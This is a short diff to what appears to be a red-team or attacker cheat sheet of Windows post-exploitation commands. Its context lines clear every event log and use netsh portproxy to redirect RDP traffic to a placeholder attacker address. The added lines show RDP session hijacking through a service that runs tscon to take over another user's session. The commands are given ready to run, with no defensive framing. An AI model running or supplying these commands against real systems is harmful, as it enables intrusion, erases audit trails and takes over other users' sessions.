@@ -555,6 +555,11 @@ foreach($log in (get-eventlog -list|foreach-object {$_.log})){clear-eventlog -lo
 # disable and redirect rdp on dc1 (out of scope?)
 DisableRDP
 netsh interface portproxy add v4tov4 listenport=3389 listenaddress=0.0.0.0 connectport=<TARGETPORT> connectaddress=<ATTACKERTIP>
+
+# hijack rdp, query tscon ID, create service
+query user # find tscon ID, e.g. 1
+sc create rdphijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"
+net start rdphijack
 ```
 
 ###### DOMAIN ESCALATION
